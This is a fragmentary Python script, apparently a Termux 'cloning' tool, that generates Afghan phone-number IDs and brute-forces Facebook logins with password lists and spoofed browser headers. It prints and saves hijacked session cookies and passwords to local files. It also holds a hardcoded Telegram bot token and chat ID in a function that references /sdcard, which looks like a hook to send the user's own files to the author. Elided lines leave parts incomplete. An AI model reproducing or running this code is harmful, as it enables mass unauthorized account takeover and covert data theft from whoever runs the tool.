...
os.system('xdg-open https://t.me/hkr_king')
print('\n\033[1;36m[✓]   WELCOME TO EHC TOOL');time.sleep(3)
...
logo =("""                
    ...
    \033[38;5;46m{𝗞𝗟𝗝}\033[38;5;46m╚╝╚╝╚╝\x1b[38;5;196m╚═══╝\033[34;1m╚╝─╚═╝\033[37;1m╚══╝\033[33;1m╚╝╚═╝\033[38;5;46m{𝗞𝗟𝗝}""")                                                                                                                                                   
def linex():
          print(f'{warna}======================================================{B}')
#------------------clear def---------------#
def clear():
	clr('clear')
	print(logo)
	print('\033[1;37m\033[1;32m[💕] WELCOME TO KALA JAHANGIR TOOLS [💖]\033[1;0m\33[1;32m')
	linex()
...
def MONIR():
	clear()
	print(f' {B} [{warna}01{B}] RONDOM AFG CLONING')
	print(f' {B} [{warna}02{B}] EXIT CLONING')
	linex()
	option=input(f' {B} [{warna}??{B}] CHOICE AN OPTION >> ')
	if option in ['01','1']:
		AFG_CLONING()
#--------------AFG CLONE----------------#
...
def AFG_CLONING():
    ...
    os.system('clear')
    print(logo)
    print(' EXAMPLE AFG SIM CODES  [9378] [9377] [9379] [9374]')
    linex()
    kode = input(' CHOSE CODE : ==>')
    linex()
    os.system('clear')
    print(logo)
    print(' EXAMPLE LIMIT [1000] [3000] [5000] [10000]')
    linex()
    ...
    try:
        for ps in pwx:
          ...
          "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5809.215", "Google Chrome";v="114.0.5809.215"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            ...
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5809.215 Safari/537.36',
            'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KLJ-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('KLJ-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KLJ-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('KLJ-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;96m[KLA JAHANGIR-TEAM]\033[1;97m] %s|\33[1;34m[SUCCESS]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def sexy():
    session=requests.session() 
    bot_token = '6748785150:AAG2TksuaD-BzmOthRhh70IcWRF5QhLNAt0' 
    chat_id = '6725671949'
    #-----------( /sdcard
    try:
